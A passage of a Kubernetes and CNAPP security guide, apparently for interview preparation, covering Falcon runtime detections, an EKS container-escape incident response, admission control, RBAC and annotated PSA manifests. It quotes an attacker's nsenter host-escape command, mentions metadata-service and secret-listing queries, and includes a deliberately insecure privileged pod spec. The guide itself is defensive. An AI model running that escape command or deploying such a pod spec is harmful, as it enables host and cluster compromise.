│  │ ├── Monitors ALL pods      │     │ ├── Monitors ALL pods      ││
│  │ │   on this node           │     │ │   on this node           ││
│  │ └── Sends telemetry to     │     │ └── Sends telemetry to     ││
│  │     Falcon Cloud (SaaS)    │     │     Falcon Cloud (SaaS)    ││
│  │                            │     │                            ││
│  │  ┌─────┐  ┌─────┐         │     │  ┌─────┐  ┌─────┐         ││
│  │  │Pod A│  │Pod B│  ← ALL  │     │  │Pod C│  │Pod D│         ││
│  │  └─────┘  └─────┘  monitored    │  └─────┘  └─────┘         ││
│  └────────────────────────────┘     └────────────────────────────┘│
└─────────────────────────────────────────────────────────────────┘

WHY PRIVILEGED?
├── The sensor needs kernel-level access for eBPF
├── This is the ONE legitimate use of privileged in production
├── KAC/PSA must ALLOW the falcon-system namespace to be privileged
├── All other namespaces enforce baseline or restricted PSS

WHAT THE SENSOR DETECTS:
├── Process execution (full parent→child tree)
├── File creation/modification (drift detection)
├── Network connections (source → destination, port, protocol)
├── DNS queries
├── Loaded kernel modules
├── /proc and /sys access patterns
└── Container escape attempts (nsenter, mount, chroot)
```

### Detection Types on Kubernetes

| Detection | What It Means | Severity | Investigation Steps |
|-----------|--------------|----------|-------------------|
| **ContainerDrift.NewExecutable** | Binary written after container start, not in original image | 🟠 High | Check: is it malware? an update? Verify image manifest. |
| **ReverseShellDetected** | Outbound shell connection to external IP | 🔴 Critical | Immediate containment → kill pod → investigate entry point |
| **ContainerEscape.Nsenter** | `nsenter` with namespace flags from inside container | 🔴 Critical | Assume host compromise → cordon node → investigate all pods on node |
| **InteractiveContainerSession** | TTY/shell opened inside production container | 🟠 High | Check: authorized debug? If not → investigate who and how |
| **CryptominingActivity** | Connection to known mining pool | 🟠 High | Kill pod → check how attacker got in → scan image |
| **SuspiciousDNSRequest** | DNS query to known malicious domain or tunneling pattern | 🟠 High | Block domain → check for data exfiltration → investigate pod |
| **KubernetesAPIAccess** | Pod accessing K8s API with service account token | 🟡 Medium | Check: does this pod need API access? If not → remove token mount |
| **PotentialKernelTampering** | Attempt to load kernel module from container | 🔴 Critical | Container escape attempt → cordon node → forensic investigation |
| **IMDSAccess** | Container querying cloud metadata service (169.254.169.254) | 🟠 High | Check: EKS pod needs IRSA, not IMDS. Block IMDSv1, enforce IMDSv2 hop limit=1 |
| **BeaconLikeTraffic** | Regular periodic outbound connections (C2 pattern) | 🟠 High | Capture traffic → check destination → correlate with TI feeds |

### 🔧 INCIDENT SCENARIO — Container Escape on EKS

```
SCENARIO: Falcon fires "ContainerEscape.Nsenter" on an EKS production cluster.

STEP 1: IDENTIFY (0-5 min)
├── Open CNAPP → Detections → Container IOA
├── Alert details:
│   ├── Cluster: prod-eks-01
│   ├── Node: ip-10-0-1-42.ec2.internal
│   ├── Pod: payments/api-server-7b4d9f-x2k9p
│   ├── Process tree: java → /bin/sh → nsenter -t 1 -m -u -i -n -p -- /bin/bash
│   └── Timestamp: 14:32 UTC
├── nsenter with ALL namespace flags (-m -u -i -n -p) targeting PID 1 = HOST ACCESS
└── Verdict: TRUE POSITIVE — CRITICAL

STEP 2: CONTAIN (5-15 min)
├── Kill the compromised pod:
│   kubectl delete pod api-server-7b4d9f-x2k9p -n payments --grace-period=0
├── Cordon the node (prevent new pods, preserve evidence):
│   kubectl cordon ip-10-0-1-42.ec2.internal
├── Apply emergency NetworkPolicy:
│   kubectl apply -f - <<EOF
│   apiVersion: networking.k8s.io/v1
│   kind: NetworkPolicy
│   metadata:
│     name: emergency-deny-all
│     namespace: payments
│   spec:
│     podSelector: {}
│     policyTypes: [Ingress, Egress]
│   EOF
├── Check if attacker read the kubelet kubeconfig:
│   → If yes: assume full cluster compromise
│   → Rotate cluster certificates immediately

STEP 3: INVESTIGATE (15-120 min)
├── ENTRY POINT:
│   ├── Was the pod privileged? → Check: kubectl get pod -o yaml | grep privileged
│   │   → YES: The pod had privileged=true, which allowed nsenter
│   │   → ROOT CAUSE: misconfiguration — should have been caught by KAC/PSA
│   ├── How did attacker get shell access?
│   │   → Check image for CVEs (RCE in Java app?)
│   │   → Check CloudTrail for EKS Exec API calls
│   │   → Check K8s audit logs for exec commands
│   └── Was the ServiceAccount overprivileged?
│       → kubectl auth can-i --list --as=system:serviceaccount:payments:api-sa
│
├── LATERAL MOVEMENT:
│   ├── Did they read /var/run/secrets/kubernetes.io/serviceaccount/token?
│   ├── Did they query the K8s API? (kubectl get secrets --all-namespaces)
│   ├── Did they query IMDS? (curl 169.254.169.254)
│   ├── Did they access other nodes? (check network flows)
│   └── CloudTrail: API calls made with the node's IAM instance profile?
│
├── DATA ACCESS:
│   ├── Did they read K8s secrets? (database passwords, API keys)
│   ├── Did they access S3, RDS, or other AWS services?
│   └── Check VPC Flow Logs for unusual data transfer volumes
│
└── PERSISTENCE:
    ├── Were new ClusterRoleBindings created? (backdoor admin access)
    ├── Were new ServiceAccounts created?
    ├── Were DaemonSets deployed? (persistence across all nodes)
    ├── Was the aws-auth ConfigMap modified? (IAM backdoor)
    └── Were new CronJobs created? (scheduled backdoor)

STEP 4: ERADICATE
├── Remove attacker persistence:
│   ├── kubectl delete clusterrolebinding <suspicious-binding>
│   ├── kubectl delete serviceaccount <rogue-sa> -n <namespace>
│   ├── kubectl delete daemonset <rogue-ds> -n <namespace>
│   └── Restore aws-auth ConfigMap from known-good backup
├── Rotate ALL secrets accessible from the compromised namespace
├── Rotate node instance profile credentials (terminate + replace node)
├── Fix the root cause:
│   ├── Remove privileged=true from the pod spec
│   ├── Enable PSA enforce=restricted on the namespace
│   └── Deploy KAC rule to PREVENT privileged pods

STEP 5: RECOVER
├── Drain the cordoned node → terminate it → auto-scaling launches clean node
├── Deploy clean application pods
├── Verify Falcon sensor running on all new nodes
├── Monitor for 72 hours with heightened alerting

STEP 6: POST-INCIDENT
├── Write incident report with full timeline
├── Action items:
│   ├── KAC: Block privileged pods in all non-system namespaces → DONE
│   ├── PSA: Enforce restricted on payments namespace → DONE
│   ├── RBAC: Audit all ClusterRoleBindings for overprivilege → SCHEDULED
│   ├── NetworkPolicy: Default deny on all production namespaces → IN PROGRESS
│   └── IMDSv2: Enforce hop limit = 1 on all EKS nodes → SCHEDULED
└── Present to leadership: root cause, impact, remediation, and hardening plan
```

## 3.4 ADMISSION CONTROL (KAC / OPA Gatekeeper)

```
ADMISSION CONTROL = THE LAST GATE BEFORE A POD RUNS

┌──────────────────────────────────────────────────────────────┐
│  kubectl apply -f deployment.yaml                              │
│         │                                                      │
│         ▼                                                      │
│  ┌──────────────┐                                             │
│  │  K8s API      │                                             │
│  │  Server       │                                             │
│  └──────┬───────┘                                             │
│         │                                                      │
│         ▼                                                      │
│  ┌──────────────────────────────────────────────────┐         │
│  │  MUTATING ADMISSION WEBHOOKS                      │         │
│  │  ├── Falcon Sensor injector (add sidecar/init)    │         │
│  │  ├── Istio sidecar injector                       │         │
│  │  └── OPA Gatekeeper (mutate if configured)        │         │
│  └──────────────────────────┬───────────────────────┘         │
│                              │                                 │
│                              ▼                                 │
│  ┌──────────────────────────────────────────────────┐         │
│  │  VALIDATING ADMISSION WEBHOOKS                    │         │
│  │                                                    │         │
│  │  🛡️ CrowdStrike KAC checks:                      │         │
│  │  ├── Is image scanned? (reject if unscanned)      │         │
│  │  ├── Critical CVEs? (reject if present)            │         │
│  │  ├── Privileged container? (reject)                │         │
│  │  ├── Root user? (reject)                           │         │
│  │  ├── hostPath mount? (reject)                      │         │
│  │  ├── Latest tag? (reject — require specific tag)   │         │
│  │  └── From approved registry? (reject if Docker Hub)│         │
│  │                                                    │         │
│  │  🛡️ OPA Gatekeeper checks (if deployed):          │         │
│  │  ├── Custom constraint templates                   │         │
│  │  ├── Label requirements                            │         │
│  │  └── Resource limit enforcement                    │         │
│  │                                                    │         │
│  │  🛡️ Pod Security Admission (PSA — built-in K8s):  │         │
│  │  ├── enforce: restricted (REJECT non-compliant)    │         │
│  │  ├── audit: restricted (LOG violation)             │         │
│  │  └── warn: restricted (WARN on kubectl)            │         │
│  └──────────────────────────┬───────────────────────┘         │
│                              │                                 │
│         ┌───────────────────┼──────────────────┐              │
│         │ ALL PASSED ✅      │ ANY REJECTED ❌    │              │
│         ▼                   ▼                   │              │
│  Pod is created        Pod is BLOCKED           │              │
│  and scheduled         Error message returned   │              │
│                        to developer              │              │
└──────────────────────────────────────────────────────────────┘

ROLLOUT STRATEGY:
Week 1-2: Deploy KAC in ALERT mode → observe what would be blocked
Week 3:   Review alerts → create exceptions for legitimate cases
Week 4:   Switch CRITICAL rules to PREVENT mode
Ongoing:  Add more rules incrementally → avoid "big bang" disruption
```

## 3.5 IDENTITY & RBAC (CIEM for Kubernetes)

```
KUBERNETES IDENTITY MODEL:

┌──────────────────────────────────────────────────────────────────┐
│                                                                    │
│  WHO CAN DO WHAT IN THE CLUSTER?                                  │
│                                                                    │
│  Layer 1: KUBERNETES RBAC                                         │
│  ├── ServiceAccount → bound to Role/ClusterRole                   │
│  │   → What can this pod do inside the cluster?                   │
│  │   → e.g., list pods, read secrets, create deployments          │
│  │                                                                 │
│  │   CNAPP CHECKS:                                                │
│  │   ├── SA has cluster-admin? → 🔴 CRITICAL                     │
│  │   ├── SA has wildcard permissions (*:*)? → 🔴 CRITICAL         │
│  │   ├── SA can list/get secrets? → 🟠 HIGH (validate need)      │
│  │   ├── SA unused for 90 days? → 🟡 MEDIUM (remove)             │
│  │   └── Multiple workloads share same SA? → 🟡 MEDIUM (isolate) │
│  │                                                                 │
│  Layer 2: CLOUD IAM (IRSA / Workload Identity / WIF)              │
│  ├── ServiceAccount → annotated with IAM Role ARN                 │
│  │   → What can this pod do in AWS/Azure/GCP?                     │
│  │   → e.g., read S3, write DynamoDB, invoke Lambda               │
│  │                                                                 │
│  │   CNAPP CHECKS (via CIEM):                                     │
│  │   ├── IRSA role has AdministratorAccess? → 🔴 CRITICAL         │
│  │   ├── IRSA role can PassRole? → 🟠 HIGH (privilege escalation) │
│  │   ├── IRSA role unused permissions? → OVERPRIVILEGED            │
│  │   ├── IRSA trust policy missing OIDC condition? → 🔴 CRITICAL  │
│  │   └── Workload can access sensitive S3 buckets? → validate      │
│  │                                                                 │
│  Layer 3: NODE INSTANCE PROFILE (Legacy — avoid)                  │
│  ├── EC2 instance → IAM Instance Profile                          │
│  │   → Every pod on this node can access these AWS permissions     │
│  │   → This is WHY you must use IRSA instead                      │
│  │                                                                 │
│  │   CNAPP CHECKS:                                                │
│  │   ├── Pods using IMDS instead of IRSA? → 🟠 HIGH              │
│  │   ├── Node instance profile has broad S3 access? → 🟠 HIGH    │
│  │   └── IMDSv1 enabled? (no hop limit) → 🔴 CRITICAL            │
│  │                                                                 │
└──────────────────────────────────────────────────────────────────┘
```

## 3.6 NETWORK VISIBILITY

```
KUBERNETES NETWORK MAP IN CNAPP:

┌─────────────────────────────────────────────────────────────────┐
│                      EKS CLUSTER NETWORK                          │
│                                                                    │
│  Internet                                                          │
│     │                                                              │
│     ▼                                                              │
│  ┌──────────┐                                                     │
│  │ AWS ALB  │ (Ingress Controller)                                │
│  └────┬─────┘                                                     │
│       │                                                            │
│  ┌────▼─────────────────────────────────────────────┐             │
│  │ Namespace: frontend                                │             │
│  │  ┌─────────────┐    NetworkPolicy:                │             │
│  │  │ nginx-pods  │    allow ingress from ALB only   │             │
│  │  └──────┬──────┘    allow egress to backend ns    │             │
│  └─────────┼────────────────────────────────────────┘             │
│            │ port 8080                                             │
│  ┌─────────▼────────────────────────────────────────┐             │
│  │ Namespace: backend                                 │             │
│  │  ┌─────────────┐    NetworkPolicy:                │             │
│  │  │ api-pods    │    allow ingress from frontend ns │             │
│  │  └──────┬──────┘    allow egress to db ns + S3    │             │
│  └─────────┼────────────────────────────────────────┘             │
│            │ port 5432                                             │
│  ┌─────────▼────────────────────────────────────────┐             │
│  │ Namespace: database                                │             │
│  │  ┌─────────────┐    NetworkPolicy:                │             │
│  │  │ postgres    │    allow ingress from backend ns  │             │
│  │  └─────────────┘    deny all egress               │             │
│  └──────────────────────────────────────────────────┘             │
│                                                                    │
│  CNAPP SHOWS:                                                      │
│  ├── ✅ frontend → backend (expected, allowed by policy)           │
│  ├── ✅ backend → database (expected, allowed by policy)           │
│  ├── ❌ database → 8.8.8.8 (UNEXPECTED — why is DB calling out?) │
│  ├── ❌ frontend → database (BYPASSING backend — investigate)      │
│  └── ❌ unknown-pod → 45.xx.xx.xx (potential C2 communication)    │
└─────────────────────────────────────────────────────────────────┘

DEFAULT DENY NETWORK POLICY (apply to EVERY namespace):

apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
```

---

# PART 4: SELF-MANAGED K8S — Extra Responsibilities

```
WHAT'S DIFFERENT WHEN YOU SELF-MANAGE:

┌────────────────────────────────────────────────────────────────┐
│ EXTRA SECURITY CHECKS CSPM RUNS ON SELF-MANAGED CLUSTERS:     │
│                                                                 │
│ CONTROL PLANE HARDENING:                                       │
│ ├── API server: --anonymous-auth=false?                        │
│ ├── API server: --authorization-mode=RBAC,Webhook?             │
│ ├── API server: --audit-log-path configured?                   │
│ ├── API server: --enable-admission-plugins includes PSA?       │
│ ├── etcd: encrypted at rest? (EncryptionConfiguration)         │
│ ├── etcd: peer communication encrypted? (--peer-cert-file)     │
│ ├── etcd: client auth required? (--client-cert-auth=true)      │
│ ├── Scheduler: --profiling=false?                              │
│ └── Controller Manager: --use-service-account-credentials?     │
│                                                                 │
│ CERTIFICATE MANAGEMENT:                                        │
│ ├── Are certificates expiring within 30 days?                  │
│ ├── Is certificate auto-rotation configured?                   │
│ └── Are weak cipher suites disabled?                           │
│                                                                 │
│ ETCD BACKUP:                                                   │
│ ├── Is etcd backed up regularly? (check CronJob/script)        │
│ ├── Are backups encrypted and stored offsite?                  │
│ └── Has backup restoration been tested?                        │
└────────────────────────────────────────────────────────────────┘
```

---

# PART 5: INTERVIEW ANSWERS FOR K8S + CNAPP

### Q: "How do you secure a Kubernetes cluster using CNAPP?"

> "I approach K8s security through six pillars. **Image Scanning** — every image is scanned in CI/CD and continuously in runtime; KAC blocks unscanned or vulnerable images at admission. **Configuration Posture** — CSPM audits all workloads against the CIS EKS Benchmark; the top 20 misconfigurations like privileged pods, root containers, missing NetworkPolicies, and wildcard RBAC are caught automatically and ticketed with SLAs. **Runtime Protection** — the Falcon sensor runs as a DaemonSet on every node, using eBPF to monitor all containers for behavioral threats like container escape, drift, reverse shells, and cryptomining. **Admission Control** — KAC intercepts every deployment and enforces image integrity, security context requirements, and registry allowlists. **Identity** — CIEM analyzes Kubernetes RBAC plus cloud IAM (IRSA/Workload Identity) to find overprivileged ServiceAccounts and unused permissions. **Network** — we map all pod-to-pod traffic, enforce default-deny NetworkPolicies, and alert on unexpected egress."

### Q: "How do you handle a container escape incident in EKS?"

> "When Falcon fires `ContainerEscape.Nsenter`, I follow the six-phase IR lifecycle. **Contain** — immediately kill the pod and cordon the node to preserve evidence. Apply a deny-all NetworkPolicy to the namespace. **Investigate** — check the process tree for the escape method, examine if the kubelet kubeconfig was accessed (which means full cluster compromise), review CloudTrail for API calls made with the node's instance profile, and check for persistence mechanisms like rogue ClusterRoleBindings or DaemonSets. **Eradicate** — remove all attacker persistence, rotate every secret the namespace had access to, replace the compromised node from a clean AMI. **Recover** — redeploy clean workloads, verify sensor coverage. **Post-incident** — the root cause was a privileged pod that should never have been deployed; I enforce PSA `restricted` on the namespace and deploy a KAC rule to permanently block privileged containers."

### Q: "What's the difference between securing EKS vs self-managed Kubernetes?"

> "With EKS, AWS manages the control plane — API server patching, etcd encryption, and certificate rotation are handled for you. My focus is entirely on the data plane: node hardening, DaemonSet sensor deployment, RBAC, PSA, NetworkPolicies, and KAC. With self-managed K8s, I also own the control plane security: hardening the API server flags (disable anonymous auth, enable audit logging), encrypting etcd at rest, managing certificate lifecycles, and maintaining etcd backups. CSPM tools like Falcon or Wiz can audit both — but for self-managed clusters, the CIS Kubernetes Benchmark has twice as many controls because it covers the control plane too. The operational burden is significantly higher, which is why most enterprises prefer managed Kubernetes."

### Q: "How does the Falcon sensor DaemonSet work on Kubernetes?"

> "The sensor deploys as a DaemonSet in the `falcon-system` namespace, ensuring exactly one sensor pod runs on every node in the cluster. It runs as a privileged container — this is the one legitimate exception to the 'no privileged' rule — because it needs kernel-level access to install eBPF probes. eBPF hooks into system call entry points, so every `execve`, `open`, `connect`, and `sendto` across ALL containers on that node is intercepted and analyzed. The sensor doesn't modify or slow down the actual system calls; it observes them and streams telemetry to the Falcon Cloud for analysis. When it detects something suspicious — like nsenter from a non-system container, or a new executable written post-start — it generates an IOA that appears in the Detections console within seconds."


---

## K8s Security Manifests Examples

# ☸️ Kubernetes Security Manifests — PSA, PSS & KAC Examples

> **Purpose:** Real YAML manifests you can explain in an interview.
> Each file is annotated line-by-line with WHY each setting exists.

---

# SECTION 1: NAMESPACE CONFIGURATION — PSA Labels

## Example 1.1: Production Namespace (Restricted PSS)

```yaml
# FILE: namespace-payments.yaml
# PURPOSE: Create a namespace for payment services with MAXIMUM security enforcement
# PSS PROFILE: restricted (strictest — blocks 17 controls)

apiVersion: v1
kind: Namespace
metadata:
  name: payments
  labels:
    # ── PSA ENFORCEMENT LABELS ──────────────────────────────────────────
    # These 3 labels activate Pod Security Admission for this namespace.
    # K8s API server reads these labels and enforces the rules automatically.

    pod-security.kubernetes.io/enforce: restricted
    # ↑ ENFORCE = pods that violate "restricted" profile are REJECTED (cannot start)
    # WHY: payments namespace handles credit card data (PCI-DSS) — no exceptions

    pod-security.kubernetes.io/audit: restricted
    # ↑ AUDIT = violations are logged in the K8s audit log (even if enforced)
    # WHY: compliance teams need audit trail of all attempted violations

    pod-security.kubernetes.io/warn: restricted
    # ↑ WARN = developers see a warning in kubectl output when they apply
    # WHY: helps developers understand why their deployment was rejected

    pod-security.kubernetes.io/enforce-version: v1.28
    # ↑ Pin to a specific K8s version's definition of "restricted"
    # WHY: prevents unexpected breakage when cluster is upgraded to a new K8s version

    # ── ORGANIZATIONAL LABELS ───────────────────────────────────────────
    team: payments-engineering
    environment: production
    data-classification: pci          # PCI-DSS regulated data
    cost-center: CC-4521
```

**Interview Explanation:**
> "I apply PSA labels directly on the namespace. The `enforce: restricted` label tells the K8s API server to reject any pod that violates the restricted profile — that includes privileged containers, root users, missing seccomp, and host namespace access. The `audit` label ensures violations are logged even when enforce is active, and `warn` gives developers clear feedback. I pin the version to prevent surprise breakage during cluster upgrades."

---

## Example 1.2: General Application Namespace (Baseline PSS)

```yaml
# FILE: namespace-backend.yaml
# PURPOSE: Standard application namespace with reasonable security defaults
# PSS PROFILE: baseline (blocks 11 dangerous settings, allows normal apps)

apiVersion: v1
kind: Namespace
metadata:
  name: backend-services
  labels:
    pod-security.kubernetes.io/enforce: baseline
    # ↑ Baseline blocks: privileged, hostPID, hostNetwork, hostIPC, hostPath,
    #   dangerous capabilities, unconfined seccomp/AppArmor
    # WHY: good enough for most apps — blocks escape vectors without
    #       being as strict as restricted

    pod-security.kubernetes.io/audit: restricted
    # ↑ AUDIT at restricted level even though we ENFORCE at baseline
    # WHY: this shows us which pods WOULD fail if we upgraded to restricted
    #       so we can plan the migration

    pod-security.kubernetes.io/warn: restricted
    # ↑ Developers see warnings about restricted violations
    # WHY: trains developers to write restricted-compliant manifests
    #       even before we enforce it

    team: backend-engineering
    environment: production
```

**Interview Explanation:**
> "I use a progressive approach: enforce baseline but audit at restricted. This blocks the most dangerous settings immediately while showing us exactly which pods need to be fixed before we can upgrade to restricted. The audit logs give me a migration roadmap without breaking anything."

---

## Example 1.3: System Infrastructure Namespace (Privileged PSS)

```yaml
# FILE: namespace-falcon-system.yaml
# PURPOSE: Namespace for CrowdStrike Falcon sensor (system-level agent)
# PSS PROFILE: privileged (no restrictions — required for security tooling)

apiVersion: v1
kind: Namespace
metadata:
  name: falcon-system
  labels:
    pod-security.kubernetes.io/enforce: privileged
    # ↑ No restrictions — sensor needs privileged access for eBPF
    # WHY: Falcon sensor must access /proc, /sys, load eBPF programs,
    #       and share hostPID to monitor all containers on the node

    pod-security.kubernetes.io/audit: privileged
    pod-security.kubernetes.io/warn: privileged
    # ↑ No auditing/warnings needed — we KNOW this is privileged

    # ── IMPORTANT: document WHY this namespace is privileged ────────────
    privileged-justification: "CrowdStrike Falcon sensor requires kernel-level
      eBPF access for runtime container monitoring. Approved by Security Architecture
      Board on 2025-01-15. Review date: 2025-07-15."

    team: security-operations
    environment: production
    managed-by: security-team    # Only security team can deploy here
```

**Interview Explanation:**
> "Only 2-3 namespaces should ever be privileged: `kube-system`, `falcon-system`, and maybe your CNI/CSI namespace. The Falcon sensor needs kernel-level eBPF access — that's the one legitimate reason for privileged. I document the justification in the namespace labels and restrict who can deploy to this namespace via RBAC."

---

# SECTION 2: POD SPECIFICATIONS — Compliant vs Non-Compliant

## Example 2.1: ❌ BAD Pod (Violates Everything)

```yaml
# FILE: bad-pod.yaml
# PURPOSE: Example of what NOT to do — this pod violates multiple PSS controls
# STATUS: Would be REJECTED by baseline and restricted PSA enforcement

apiVersion: v1
kind: Pod
metadata:
  name: insecure-app
  namespace: payments        # This namespace enforces "restricted" PSS
spec:
  hostPID: true              # ❌ VIOLATION #1: shares host PID namespace
                             # RISK: can see all processes on the host node
                             # PSS: blocked by baseline AND restricted

  hostNetwork: true          # ❌ VIOLATION #2: uses host's network stack
                             # RISK: bypasses NetworkPolicies entirely
                             # PSS: blocked by baseline AND restricted

  containers:
  - name: app
    image: myapp:latest      # ❌ VIOLATION #3: uses "latest" tag (not PSS but bad practice)
                             # RISK: non-reproducible builds, can be overwritten

    securityContext:
      privileged: true       # ❌ VIOLATION #4: full host kernel access
                             # RISK: container escape via nsenter, mount, etc.
                             # PSS: blocked by baseline AND restricted

      runAsUser: 0           # ❌ VIOLATION #5: running as root (UID 0)
                             # RISK: root inside = root on host in escape scenarios
                             # PSS: blocked by restricted

      allowPrivilegeEscalation: true
                             # ❌ VIOLATION #6: allows SUID escalation
                             # RISK: non-root user can become root via SUID binaries
                             # PSS: blocked by restricted

      capabilities:
        add:
        - SYS_ADMIN          # ❌ VIOLATION #7: god capability
        - NET_RAW            # ❌ VIOLATION #8: allows raw packet crafting
                             # RISK: mount host FS, ARP spoofing, escape
                             # PSS: blocked by baseline (SYS_ADMIN), restricted (all)

    env:
    - name: DB_PASSWORD      # ❌ BAD PRACTICE: secrets in env vars
      value: "SuperSecret123"
                             # RISK: visible via kubectl exec, printenv, /proc

    volumeMounts:
    - name: host-root
      mountPath: /host

  volumes:
  - name: host-root
    hostPath:                # ❌ VIOLATION #9: mounts host filesystem
      path: /                # RISK: read/write entire host — game over
      type: Directory        # PSS: blocked by baseline AND restricted

# RESULT: PSA will reject this pod with error:
# "Error from server (Forbidden): pods "insecure-app" is forbidden:
#  violates PodSecurity "restricted:v1.28":
#  privileged, hostPID, hostNetwork, hostPath volumes,
#  runAsNonRoot != true, allowPrivilegeEscalation != false,
#  unrestricted capabilities, no seccomp profile"
```

---

## Example 2.2: ✅ GOOD Pod (PSS Restricted Compliant)

```yaml
# FILE: secure-pod.yaml
# PURPOSE: Fully PSS restricted-compliant pod — passes all 17 controls
# STATUS: Will be ACCEPTED in any namespace (privileged, baseline, restricted)

apiVersion: v1
kind: Pod
metadata:
  name: secure-app
  namespace: payments        # restricted enforcement — this pod passes ✅
  labels:
    app: payment-api
    version: v2.3.1
spec:
  # ── NO HOST NAMESPACE SHARING ─────────────────────────────────────
  # hostPID, hostNetwork, hostIPC are all FALSE by default
  # We don't even need to specify them — but being explicit is clearer
  hostPID: false             # ✅ Don't share host PID namespace
  hostNetwork: false         # ✅ Don't use host network — use pod networking
  hostIPC: false             # ✅ Don't share host IPC

  # ── SERVICE ACCOUNT SECURITY ──────────────────────────────────────
  automountServiceAccountToken: false
  # ↑ ✅ Don't mount K8s API token into the pod
  # WHY: this app doesn't need to call the K8s API
  #       if compromised, attacker can't use the SA token to pivot

  serviceAccountName: payment-api-sa
  # ↑ Use a dedicated ServiceAccount (not "default")
  # WHY: least privilege — each app gets its own SA with minimal RBAC

  # ── SECURITY CONTEXT (POD LEVEL) ─────────────────────────────────
  securityContext:
    runAsNonRoot: true       # ✅ PSS CONTROL #14: no container can run as root
    runAsUser: 1000          # ✅ PSS CONTROL #15: explicit non-root UID
    runAsGroup: 1000         # ✅ Run as non-root group too
    fsGroup: 1000            # ✅ Files created by pod owned by this group
    seccompProfile:
      type: RuntimeDefault   # ✅ PSS CONTROL #16: system call filtering enabled
                             # Blocks ~44 dangerous syscalls (mount, ptrace, reboot)

  containers:
  - name: app
    image: 123456789.dkr.ecr.us-east-1.amazonaws.com/payment-api:v2.3.1@sha256:abc123...
    # ↑ ✅ Uses:
    #   - Private ECR registry (not Docker Hub)
    #   - Specific version tag (not :latest)
    #   - Image digest (@sha256) for immutability

    # ── SECURITY CONTEXT (CONTAINER LEVEL) ────────────────────────
    securityContext:
      allowPrivilegeEscalation: false
      # ↑ ✅ PSS CONTROL #13: prevents SUID/setuid escalation

      readOnlyRootFilesystem: true
      # ↑ ✅ Blocks writing to container filesystem
      # WHY: prevents attackers from downloading malware/tools
      #       also prevents drift detection (no new executables)

      capabilities:
        drop:
        - ALL                # ✅ PSS CONTROL #17: drop every Linux capability
        add:
        - NET_BIND_SERVICE   # ✅ Add back ONLY what's needed (bind port < 1024)
                             # This is the ONLY capability allowed by PSS restricted

    # ── RESOURCE LIMITS ───────────────────────────────────────────
    resources:
      requests:
        cpu: "100m"          # ✅ Guaranteed minimum CPU
        memory: "128Mi"      # ✅ Guaranteed minimum memory
      limits:
        cpu: "500m"          # ✅ Maximum CPU (prevents CPU theft / mining)
        memory: "512Mi"      # ✅ Maximum memory (prevents OOM of node)
    # WHY: Without limits, a compromised pod can consume ALL node resources
    #       including starving the Falcon sensor DaemonSet

    # ── PORTS ─────────────────────────────────────────────────────
    ports:
    - containerPort: 8443    # ✅ App listens on non-privileged port
      protocol: TCP
    # WHY: Ports < 1024 require NET_BIND_SERVICE capability
    #       Using 8443 instead of 443 avoids needing that capability

    # ── HEALTH CHECKS ────────────────────────────────────────────
    livenessProbe:
      httpGet:
        path: /healthz
        port: 8443
      initialDelaySeconds: 15
      periodSeconds: 10
    readinessProbe:
      httpGet:
        path: /ready
        port: 8443
      initialDelaySeconds: 5
      periodSeconds: 5
    # WHY: K8s uses probes to restart unhealthy pods and route traffic
    #       Without probes, a crashed app stays running but broken

    # ── ENVIRONMENT VARIABLES (NO SECRETS HERE) ──────────────────
    env:
    - name: APP_ENV
      value: "production"
    - name: LOG_LEVEL
      value: "info"
    # ✅ No secrets in env vars! Secrets are mounted as files (below)

    # ── VOLUME MOUNTS ────────────────────────────────────────────
    volumeMounts:
    - name: tmp
      mountPath: /tmp        # ✅ Writable temp directory (readOnly root FS needs this)
    - name: app-secrets
      mountPath: /etc/secrets
      readOnly: true         # ✅ Secrets mounted as read-only files

  # ── VOLUMES ──────────────────────────────────────────────────────
  volumes:
  - name: tmp
    emptyDir:
      sizeLimit: "100Mi"     # ✅ PSS CONTROL #12: only allowed volume types
                             # emptyDir is allowed by restricted profile
                             # sizeLimit prevents disk abuse
  - name: app-secrets
    secret:                  # ✅ PSS CONTROL #12: secret volume type is allowed
      secretName: payment-api-creds
      # Or better: use External Secrets Operator to sync from AWS Secrets Manager
```

**Interview Explanation:**
> "This pod passes all 17 PSS restricted controls. Key points: `runAsNonRoot: true` with explicit UID 1000, `readOnlyRootFilesystem: true` with emptyDir for /tmp, `drop: ALL` capabilities with only NET_BIND_SERVICE added back, RuntimeDefault seccomp profile, no host namespace sharing, no auto-mounted SA token, and resource limits. The image is from private ECR with a digest pin. No secrets in environment variables — they're mounted as read-only files."

---

# SECTION 3: RBAC — ServiceAccount with Least Privilege

## Example 3.1: Minimal ServiceAccount (App That Doesn't Need K8s API)

```yaml
# FILE: sa-payment-api.yaml
# PURPOSE: ServiceAccount for payment-api that does NOT need K8s API access
# KEY: automountServiceAccountToken is set to FALSE

apiVersion: v1
kind: ServiceAccount
metadata:
  name: payment-api-sa
  namespace: payments
  annotations:
    # IRSA annotation — gives this pod AWS permissions without instance profile
    eks.amazonaws.com/role-arn: arn:aws:iam::123456789:role/PaymentApiRole
    # ↑ WHY: This pod needs to read from DynamoDB and write to SQS
    #         IRSA scopes AWS permissions to THIS specific ServiceAccount
    #         Other pods on the same node CANNOT use these AWS permissions

automountServiceAccountToken: false
# ↑ ✅ This pod doesn't need to call the K8s API
#      No token mounted = no lateral movement if compromised
#      90% of application pods should have this set to false
```

## Example 3.2: ServiceAccount That Needs K8s API Access (Monitoring)

```yaml
# FILE: sa-monitoring.yaml
# PURPOSE: ServiceAccount for Prometheus that DOES need K8s API access
# KEY: minimal RBAC — only read pods and endpoints, nothing else

---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: prometheus-sa
  namespace: monitoring
# automountServiceAccountToken defaults to true (Prometheus needs API access)

---
# Role: what actions are allowed
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: prometheus-reader
rules:
- apiGroups: [""]
  resources: ["pods", "endpoints", "services", "nodes"]
  verbs: ["get", "list", "watch"]       # ✅ Read-only — no create/update/delete
  # WHY: Prometheus needs to discover pods for scraping
  #       It only needs to READ, never to modify anything

- apiGroups: [""]
  resources: ["secrets"]
  verbs: []                              # ✅ EXPLICITLY no access to secrets
  # WHY: Prometheus has no business reading K8s secrets
  #       Making this explicit prevents accidental role aggregation

# ❌ DANGEROUS — what NOT to do:
# rules:
# - apiGroups: ["*"]
#   resources: ["*"]
#   verbs: ["*"]           # ← This is cluster-admin. NEVER do this.

---
# Binding: who gets the role
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
